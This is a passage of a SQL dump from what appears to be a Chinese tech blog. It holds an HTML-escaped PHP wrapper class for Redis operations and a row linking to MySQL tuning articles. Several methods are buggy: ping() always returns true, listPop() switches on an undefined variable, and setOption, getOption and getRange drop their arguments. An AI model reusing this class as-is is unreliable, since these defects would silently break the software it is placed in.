\r\n     \r\n        if (!isset($this-&amp;gt;_REDIS)) { \r\n            $this-&amp;gt;_REDIS = new Redis(); \r\n            $this-&amp;gt;connect($this-&amp;gt;_HOST, $this-&amp;gt;_PORT, $this-&amp;gt;_TIMEOUT, $this-&amp;gt;_DBNAME, $this-&amp;gt;_CTYPE); \r\n        } \r\n    } \r\n     \r\n    /**\r\n     * 连接redis服务器\r\n     */ \r\n    private function connect($host,$port,$timeout,$dbname,$type) \r\n    { \r\n        switch ($type) { \r\n            case 1: \r\n                $this-&amp;gt;_REDIS-&amp;gt;connect($host, $port, $timeout); \r\n            break; \r\n            case 2: \r\n                $this-&amp;gt;_REDIS-&amp;gt;pconnect($host, $port, $timeout); \r\n            break; \r\n            default: \r\n            break; \r\n        } \r\n    } \r\n     \r\n    /**\r\n     * 查看redis连接是否断开\r\n     * @return $return bool true:连接未断开 false:连接已断开\r\n     */ \r\n    public function ping() \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;ping(); \r\n     \r\n        return &#039;PONG&#039; ? true : false; \r\n    } \r\n     \r\n    /**\r\n     * 设置redis模式参数\r\n     * @param $option array 参数数组键值对\r\n     * @return $return true/false \r\n     */ \r\n    public function setOption($option=array()) \r\n    { \r\n        return $this-&amp;gt;_REDIS-&amp;gt;setOption(); \r\n    } \r\n     \r\n    /**\r\n     * 获取redis模式参数\r\n     * @param $option array 要获取的参数数组\r\n     */ \r\n    public function getOption($option=array()) \r\n    { \r\n        return $this-&amp;gt;_REDIS-&amp;gt;getOption(); \r\n    } \r\n     \r\n    /**\r\n     * 写入key-value\r\n     * @param $key string 要存储的key名\r\n     * @param $value mixed 要存储的值\r\n     * @param $type int 写入方式 0:不添加到现有值后面 1:添加到现有值的后面 默认0 \r\n     * @param $repeat int 0:不判断重复 1:判断重复\r\n     * @param $time float 过期时间(S)\r\n     * @param $old int 1:返回旧的value 默认0\r\n     * @return $return bool true:成功 flase:失败\r\n     */ \r\n    public function set($key,$value,$type=0,$repeat=0,$time=0,$old=0) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($type) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;append($key, $value); \r\n        } else { \r\n            if ($old) { \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;getSet($key, $value); \r\n            } else { \r\n                if ($repeat) { \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;setnx($key, $value); \r\n                } else { \r\n                    if ($time &amp;amp;&amp;amp; is_numeric($time)) $return = $this-&amp;gt;_REDIS-&amp;gt;setex($key, $time, $value); \r\n                    else $return = $this-&amp;gt;_REDIS-&amp;gt;set($key, $value); \r\n                } \r\n            } \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取某个key值 如果指定了start end 则返回key值的start跟end之间的字符\r\n     * @param $key string/array 要获取的key或者key数组\r\n     * @param $start int 字符串开始index\r\n     * @param $end int 字符串结束index\r\n     * @return $return mixed 如果key存在则返回key值 如果不存在返回false\r\n     */ \r\n    public function get($key=null,$start=null,$end=null) \r\n    { \r\n        $return = null; \r\n     \r\n        if (is_array($key) &amp;amp;&amp;amp; !empty($key)) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;getMultiple($key); \r\n        } else { \r\n            if (isset($start) &amp;amp;&amp;amp; isset($end)) $return = $this-&amp;gt;_REDIS-&amp;gt;getRange($key); \r\n            else $return = $this-&amp;gt;_REDIS-&amp;gt;get($key); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 删除某个key值\r\n     * @param $key array key数组\r\n     * @return $return longint 删除成功的key的个数\r\n     */ \r\n    public function delete($key=array()) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;delete($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 判断某个key是否存在\r\n     * @param $key string 要查询的key名\r\n     */ \r\n    public function exists($key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;exists($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * key值自增或者自减\r\n     * @param $key string key名\r\n     * @param $type int 0:自减 1:自增 默认为1\r\n     * @param $n int 自增步长 默认为1\r\n     */ \r\n    public function deinc($key,$type=1,$n=1) \r\n    { \r\n        $return = null; \r\n        $n = (int)$n; \r\n     \r\n        switch ($type) { \r\n            case 0: \r\n                if ($n == 1) $return = $this-&amp;gt;_REDIS-&amp;gt;decr($key); \r\n                else if ($n &amp;gt; 1) $return = $this-&amp;gt;_REDIS-&amp;gt;decrBy($key, $n); \r\n            break; \r\n            case 1: \r\n                if ($n == 1) $return = $this-&amp;gt;_REDIS-&amp;gt;incr($key); \r\n                else if ($n &amp;gt; 1) $return = $this-&amp;gt;_REDIS-&amp;gt;incrBy($key, $n); \r\n            break; \r\n            default: \r\n                $return = false; \r\n            break; \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 同时给多个key赋值\r\n     * @param $data array key值数组 array(&#039;key0&#039;=&amp;gt;&#039;value0&#039;,&#039;key1&#039;=&amp;gt;&#039;value1&#039;)\r\n     */ \r\n    public function mset($data) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;mset($data); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 查询某个key的生存时间\r\n     * @param $key string 要查询的key名\r\n     */ \r\n    public function ttl($key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;ttl($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 删除到期的key\r\n     * @param $key string key名\r\n     */ \r\n    public function persist($key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;persist($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取某一key的value\r\n     * @param $key string key名\r\n     */ \r\n    public function strlen($key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;strlen($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------队列操作-------------------------+++// \r\n     \r\n    /**\r\n     * 入队列\r\n     * @param $list string 队列名\r\n     * @param $value mixed 入队元素值\r\n     * @param $deriction int 0:数据入队列头(左) 1:数据入队列尾(右) 默认为0\r\n     * @param $repeat int 判断value是否存在  0:不判断存在 1:判断存在 如果value存在则不入队列\r\n     */ \r\n    public function listPush($list,$value,$direction=0,$repeat=0) \r\n    { \r\n        $return = null; \r\n     \r\n        switch ($direction) { \r\n            case 0: \r\n                if ($repeat) \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;lPushx($list,$value); \r\n                else \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;lPush($list,$value); \r\n            break; \r\n            case 1: \r\n                if ($repeat) \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;rPushx($list,$value); \r\n                else \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;rPush($list,$value); \r\n            break; \r\n            default: \r\n                $return = false; \r\n            break; \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 出队列\r\n     * @param $list1 string 队列名\r\n     * @param $deriction int 0:数据入队列头(左) 1:数据入队列尾(右) 默认为0\r\n     * @param $list2 string 第二个队列名 默认null\r\n     * @param $timeout int timeout为0:只获取list1队列的数据 \r\n     *        timeout&amp;gt;0:如果队列list1为空 则等待timeout秒 如果还是未获取到数据 则对list2队列执行pop操作\r\n     */ \r\n    public function listPop($list1,$deriction=0,$list2=null,$timeout=0) \r\n    { \r\n        $return = null; \r\n     \r\n        switch ($direction) { \r\n            case 0: \r\n                if ($timeout &amp;amp;&amp;amp; $list2) \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;blPop($list1,$list2,$timeout); \r\n                else \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;lPop($list1); \r\n            break; \r\n            case 1: \r\n                if ($timeout &amp;amp;&amp;amp; $list2) \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;brPop($list1,$list2,$timeout); \r\n                else \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;rPop($list1); \r\n            break; \r\n            default: \r\n                $return = false; \r\n            break; \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取队列中元素数\r\n     * @param $list string 队列名\r\n     */ \r\n    public function listSize($list) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;lSize($list); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 为list队列的index位置的元素赋值\r\n     * @param $list string 队列名\r\n     * @param $index int 队列元素位置\r\n     * @param $value mixed 元素值\r\n     */ \r\n    public function listSet($list,$index=0,$value=null) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;lSet($list, $index, $value); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取list队列的index位置的元素值\r\n     * @param $list string 队列名\r\n     * @param $index int 队列元素开始位置 默认0\r\n     * @param $end int 队列元素结束位置 $index=0,$end=-1:返回队列所有元素\r\n     */ \r\n    public function listGet($list,$index=0,$end=null) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($end) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;lRange($list, $index, $end); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;lGet($list, $index); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 截取list队列，保留start至end之间的元素\r\n     * @param $list string 队列名\r\n     * @param $start int 开始位置\r\n     * @param $end int 结束位置\r\n     */ \r\n    public function listTrim($list,$start=0,$end=-1) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;lTrim($list, $start, $end); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 删除list队列中count个值为value的元素\r\n     * @param $list string 队列名\r\n     * @param $value int 元素值\r\n     * @param $count int 删除个数 0:删除所有 &amp;gt;0:从头部开始删除 &amp;lt;0:从尾部开始删除 默认为0删除所有\r\n     */ \r\n    public function listRemove($list,$value,$count=0) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;lRem($list, $value, $count); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 在list中值为$value1的元素前Redis::BEFORE或者后Redis::AFTER插入值为$value2的元素\r\n     * 如果list不存在，不会插入，如果$value1不存在，return -1\r\n     * @param $list string 队列名\r\n     * @param $location int 插入位置 0:之前 1:之后\r\n     * @param $value1 mixed 要查找的元素值\r\n     * @param $value2 mixed 要插入的元素值\r\n     */ \r\n    public function listInsert($list,$location=0,$value1,$value2) \r\n    { \r\n        $return = null; \r\n     \r\n        switch ($location) { \r\n            case 0: \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;lInsert($list, Redis::BEFORE, $value1, $value2); \r\n            break; \r\n            case 1: \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;lInsert($list, Redis::AFTER, $value1, $value2); \r\n            break; \r\n            default: \r\n                $return = false; \r\n            break; \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * pop出list1的尾部元素并将该元素push入list2的头部\r\n     * @param $list1 string 队列名\r\n     * @param $list2 string 队列名\r\n     */ \r\n    public function rpoplpush($list1, $list2) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;rpoplpush($list1, $list2); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------集合操作-------------------------+++// \r\n     \r\n    /**\r\n     * 将value写入set集合 如果value存在 不写入 返回false\r\n     * 如果是有序集合则根据score值更新该元素的顺序\r\n     * @param $set string 集合名\r\n     * @param $value mixed 值\r\n     * @param $stype int 集合类型 0:无序集合 1:有序集和 默认0\r\n     * @param $score int 元素排序值\r\n     */ \r\n    public function setAdd($set,$value=null,$stype=0,$score=null) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($stype &amp;amp;&amp;amp; $score !== null) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;zAdd($set, $score, $value); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;sAdd($set, $value); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 移除set1中的value元素 如果指定了set2 则将该元素写入set2\r\n     * @param $set1 string 集合名\r\n     * @param $value mixed 值\r\n     * @param $stype int 集合类型 0:无序集合 1:有序集和 默认0\r\n     * @param $set2 string 集合名\r\n     */ \r\n    public function setMove($set1, $value=null, $stype=0, $set2=null) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($set2) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;sMove($set1, $set2, $value); \r\n        } else { \r\n            if ($stype) $return = $this-&amp;gt;_REDIS-&amp;gt;zRem($set1, $value); \r\n            else $return = $this-&amp;gt;_REDIS-&amp;gt;sRem($set1, $value); \r\n        } \r\n             \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 查询set中是否有value元素\r\n     * @param $set string 集合名\r\n     * @param $value mixed 值\r\n     */ \r\n    public function setSearch($set, $value=null) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;sIsMember($set, $value); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 返回set中所有元素个数 有序集合要指定$stype=1\r\n     * 如果是有序集合并指定了$start和$end 则返回score在start跟end之间的元素个数\r\n     * @param $set string 集合名\r\n     * @param $stype int 集合类型 0:无序集合 1:有序集和 默认0\r\n     * @param $start int 开始index\r\n     * @param $end int 结束index\r\n     */ \r\n    public function setSize($set,$stype=0,$start=0,$end=0) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($stype) { \r\n            if ($start &amp;amp;&amp;amp; $end) $return = $this-&amp;gt;_REDIS-&amp;gt;zCount($set, $start, $end); \r\n            else $return = $this-&amp;gt;_REDIS-&amp;gt;zSize($set); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;sSize($set); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 随机返回set中一个元素并可选是否删除该元素\r\n     * @param $set string 集合名\r\n     * @param $isdel int 是否删除该元素 0:不删除 1:删除 默认为0\r\n     */ \r\n    public function setPop($set,$isdel=0) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($isdel) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;sPop($set); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;sRandMember($set); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 求交集 并可选是否将交集保存到新集合\r\n     * @param $set array 集合名数组\r\n     * @param $newset string 要保存到的集合名 默认为null 即不保存交集到新集合\r\n     * @param $stype int 集合类型 0:无序集合 1:有序集和 默认0\r\n     * @param $weight array 权重 执行function操作时要指定的每个集合的相同元素所占的权重 默认1\r\n     * @param $function string 不同集合的相同元素的取值规则函数 SUM:取元素值的和 MAX:取最大值元素 MIN:取最小值元素\r\n     */ \r\n    public function setInter($set,$newset=null,$stype=0,$weight=array(1),$function=&#039;SUM&#039;) \r\n    { \r\n        $return = array(); \r\n     \r\n        if (is_array($set) &amp;amp;&amp;amp; !empty($set)) { \r\n            if ($newset) { \r\n                if ($stype) $return = $this-&amp;gt;_REDIS-&amp;gt;zInter($newset, $set, $weight, $function); \r\n                else $return = $this-&amp;gt;_REDIS-&amp;gt;sInterStore($newset, $set); \r\n            } else { \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;sInter($set); \r\n            } \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 求并集 并可选是否将交集保存到新集合\r\n     * @param $set array 集合名数组\r\n     * @param $newset string 要保存到的集合名 默认为null 即不保存交集到新集合\r\n     * @param $stype int 集合类型 0:无序集合 1:有序集和 默认0\r\n     * @param $weight array 权重 执行function操作时要指定的每个集合的相同元素所占的权重 默认1\r\n     * @param $function string 不同集合的相同元素的取值规则函数 SUM:取元素值的和 MAX:取最大值元素 MIN:取最小值元素\r\n     */ \r\n    public function setUnion($set,$newset=null,$stype=0,$weight=array(1),$function=&#039;SUM&#039;) \r\n    { \r\n        $return = array(); \r\n     \r\n        if (is_array($set) &amp;amp;&amp;amp; !empty($set)) { \r\n            if ($newset) { \r\n                if ($stype) $return = $this-&amp;gt;_REDIS-&amp;gt;zUnion($newset, $set, $weight, $function); \r\n                else $return = $this-&amp;gt;_REDIS-&amp;gt;sUnionStore($newset, $set); \r\n            } else { \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;sUnion($set); \r\n            } \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 求差集 并可选是否将交集保存到新集合\r\n     * @param $set array 集合名数组\r\n     * @param $newset string 要保存到的集合名 默认为null 即不保存交集到新集合\r\n     */ \r\n    public function setDiff($set,$newset=null) \r\n    { \r\n        $return = array(); \r\n     \r\n        if (is_array($set) &amp;amp;&amp;amp; !empty($set)) { \r\n            if ($newset) { \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;sDiffStore($newset, $set); \r\n            } else { \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;sDiff($set); \r\n            } \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 返回set中所有元素\r\n     * @param $set string 集合名\r\n     */ \r\n    public function setMembers($set) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;sMembers($set); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 排序 分页等\r\n     * @param $set string 集合名\r\n     * @param $option array 选项\r\n     */ \r\n    public function setSort($set,$option) \r\n    { \r\n        $return = null; \r\n        $default_option = array( \r\n            &#039;by&#039;    =&amp;gt; &#039;some_pattern_*&#039;, //要匹配的排序value值 \r\n            &#039;limit&#039; =&amp;gt; array(0, 1), //array(start,length) \r\n            &#039;get&#039;   =&amp;gt; &#039;some_other_pattern_*&#039;, //多个匹配格式:array(&#039;some_other_pattern1_*&#039;,&#039;some_other_pattern2_*&#039;) \r\n            &#039;sort&#039;  =&amp;gt; &#039;asc&#039;, // asc|desc 默认asc \r\n            &#039;alpha&#039; =&amp;gt; TRUE, // \r\n            &#039;store&#039; =&amp;gt; &#039;some_need_pattern_*&#039; //永久性排序值 \r\n        ); \r\n     \r\n        $option = array_merge($default_option, $option); \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;sort($set, $option); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------有序集合操作-------------------------+++// \r\n     \r\n    /**\r\n     * ***只针对有序集合操作\r\n     * 返回set中index从start到end的所有元素\r\n     * @param $set string 集合名\r\n     * @param $start int 开始Index\r\n     * @param $end int 结束Index\r\n     * @param $order int 排序方式 0:从小到大排序 1:从大到小排序 默认0\r\n     * @param $score bool 元素排序值 false:返回数据不带score true:返回数据带score 默认false\r\n     */ \r\n    public function setRange($set,$start,$end,$order=0,$score=false) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($order) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;zRevRange($set, $start, $end, $score); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;zRange($set, $start, $end, $score); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * ***只针对有序集合操作\r\n     * 删除set中score从start到end的所有元素\r\n     * @param $set string 集合名\r\n     * @param $start int 开始score\r\n     * @param $end int 结束score\r\n     */ \r\n    public function setDeleteRange($set,$start,$end) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;zRemRangeByScore($set, $start, $end); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * ***只针对有序集合操作\r\n     * 获取set中某个元素的score \r\n     * 如果指定了inc参数 则给该元素的score增加inc值\r\n     * 如果没有该元素 则将该元素写入集合\r\n     * @param $set string 集合名\r\n     * @param $value mixed 元素值\r\n     * @param $inc int 要给score增加的数值 默认是null 不执行score增加操作\r\n     */ \r\n    public function setScore($set,$value,$inc=null) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($inc) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;zIncrBy($set, $inc, $value); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;zScore($set, $value); \r\n        } \r\n             \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------哈希操作-------------------------+++// \r\n     \r\n    /**\r\n     * 将key-&amp;gt;value写入hash表中\r\n     * @param $hash string 哈希表名\r\n     * @param $data array 要写入的数据 array(&#039;key&#039;=&amp;gt;&#039;value&#039;)\r\n     */ \r\n    public function hashSet($hash,$data) \r\n    { \r\n        $return = null; \r\n     \r\n        if (is_array($data) &amp;amp;&amp;amp; !empty($data)) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;hMset($hash, $data); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取hash表的数据\r\n     * @param $hash string 哈希表名\r\n     * @param $key mixed 表中要存储的key名 默认为null 返回所有key&amp;gt;value\r\n     * @param $type int 要获取的数据类型 0:返回所有key 1:返回所有value 2:返回所有key-&amp;gt;value\r\n     */ \r\n    public function hashGet($hash,$key=array(),$type=0) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($key) { \r\n            if (is_array($key) &amp;amp;&amp;amp; !empty($key)) \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;hMGet($hash,$key); \r\n            else \r\n                $return = $this-&amp;gt;_REDIS-&amp;gt;hGet($hash,$key); \r\n        } else { \r\n            switch ($type) { \r\n                case 0: \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;hKeys($hash); \r\n                break; \r\n                case 1: \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;hVals($hash); \r\n                break; \r\n                case 2: \r\n                    $return = $this-&amp;gt;_REDIS-&amp;gt;hGetAll($hash); \r\n                break; \r\n                default: \r\n                    $return = false; \r\n                break; \r\n            } \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取hash表中元素个数\r\n     * @param $hash string 哈希表名\r\n     */ \r\n    public function hashLen($hash) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;hLen($hash); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 删除hash表中的key\r\n     * @param $hash string 哈希表名\r\n     * @param $key mixed 表中存储的key名\r\n     */ \r\n    public function hashDel($hash,$key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;hDel($hash,$key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 查询hash表中某个key是否存在\r\n     * @param $hash string 哈希表名\r\n     * @param $key mixed 表中存储的key名\r\n     */ \r\n    public function hashExists($hash,$key) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;hExists($hash,$key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 自增hash表中某个key的值\r\n     * @param $hash string 哈希表名\r\n     * @param $key mixed 表中存储的key名\r\n     * @param $inc int 要增加的值\r\n     */ \r\n    public function hashInc($hash,$key,$inc) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;hIncrBy($hash, $key, $inc); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------其他操作-------------------------+++// \r\n     \r\n    /**\r\n     * 自增hash表中某个key的值\r\n     * @param $key string 哈希表名\r\n     * @param $time mixed 表中存储的key名\r\n     */ \r\n    public function setKeyExpire($key, $time) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;setTimeout($key, $time); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取满足给定pattern的所有key\r\n     * @param $key regexp key匹配表达式 模式:user* 匹配以user开始的key\r\n     */ \r\n    public function getKeys($key=null) \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;keys($key); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 将数据保存到硬盘 同步/异步\r\n     * @param $type int 保存方式 0:同步 1:异步 默认0\r\n     * @param $time int 是否要获取上次成功将数据保存到磁盘的Unix时戳 0:不返回时间 1:返回时间\r\n     */ \r\n    public function hwSave($type=0,$time=0) \r\n    { \r\n        $return = null; \r\n     \r\n        if ($type) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;bgsave(); \r\n        } else { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;save(); \r\n        } \r\n        if ($time) { \r\n            $return = $this-&amp;gt;_REDIS-&amp;gt;lastSave(); \r\n        } \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取上次成功将数据保存到磁盘的Unix时戳\r\n     */ \r\n    public function lastSave() \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;lastSave(); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取redis版本信息等详情\r\n     */ \r\n    public function info() \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;info(); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    /**\r\n     * 获取数据库中key的数目\r\n     */ \r\n    public function dbSize() \r\n    { \r\n        $return = null; \r\n     \r\n        $return = $this-&amp;gt;_REDIS-&amp;gt;dbSize(); \r\n     \r\n        return $return; \r\n    } \r\n     \r\n    //+++-------------------------事务操作-------------------------+++// \r\n     \r\n    /**\r\n     * 开始进入事务操作\r\n     * @param $return object 事务对象\r\n     */ \r\n    public function tranStart() \r\n    { \r\n        $this-&amp;gt;_TRANSCATION = $this-&amp;gt;_REDIS-&amp;gt;multi(); \r\n    } \r\n     \r\n    /**\r\n     * 提交完成事务\r\n     * @param $return bool 事务执行成功 提交操作\r\n     */ \r\n    public function tranCommit() \r\n    { \r\n        return $this-&amp;gt;_TRANSCATION-&amp;gt;exec(); \r\n    } \r\n     \r\n    /**\r\n     * 回滚事务\r\n     * @param $return bool 事务执行失败 回滚操作\r\n     */ \r\n    public function tranRollback() \r\n    { \r\n        return $this-&amp;gt;_TRANSCATION-&amp;gt;discard(); \r\n    } \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776766),
(45, 45, '&lt;p&gt;文章作者：简朝阳&lt;/p&gt;&lt;p&gt;Blog地址：&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com&quot;&gt;http://isky000.com&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;MySQL数据库性能优化之缓存参数优化&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com/database/mysql-perfornamce-tuning-cache-parameter&quot;&gt;http://isky000.com/database/mysql-perfornamce-tuning-cache-parameter&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;MySQL数据库性能优化之表结构优化&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com/database/mysql-perfornamce-tuning-schema&quot;&gt;http://isky000.com/database/mysql-perfornamce-tuning-schema&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;MySQL数据库性能优化之索引优化&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com/database/mysql-performance-tuning-index&quot;&gt;http://isky000.com/database/mysql-performance-tuning-index&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;MySQL数据库性能优化之SQL优化&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com/database/mysql-performance-tuning-sql&quot;&gt;http://isky000.com/database/mysql-performance-tuning-sql&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;MySQL数据库性能优化之存储引擎选择&lt;/strong&gt;&lt;/p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://isky000.com/database/mysql-performance-tuning-storage-engine&quot;&gt;http://isky000.com/database/mysql-performance-tuning-storage-engine&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776893);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
